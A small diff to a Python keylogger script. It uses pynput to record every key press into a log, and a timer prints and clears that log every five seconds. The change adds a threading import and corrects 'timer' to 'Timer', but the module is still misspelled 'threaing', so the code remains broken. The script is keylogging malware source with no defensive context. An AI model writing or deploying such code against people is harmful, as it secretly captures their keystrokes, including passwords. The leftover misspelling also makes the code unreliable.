@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 import pynput.keyboard
+import threading
 
 log = ""
 
@@ -18,7 +19,7 @@ def report():
     global log
     print(log)
     log = ""
-    timer = threaing.timer(5, report)
+    timer = threaing.Timer(5, report)
     timer.start()
 
 keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
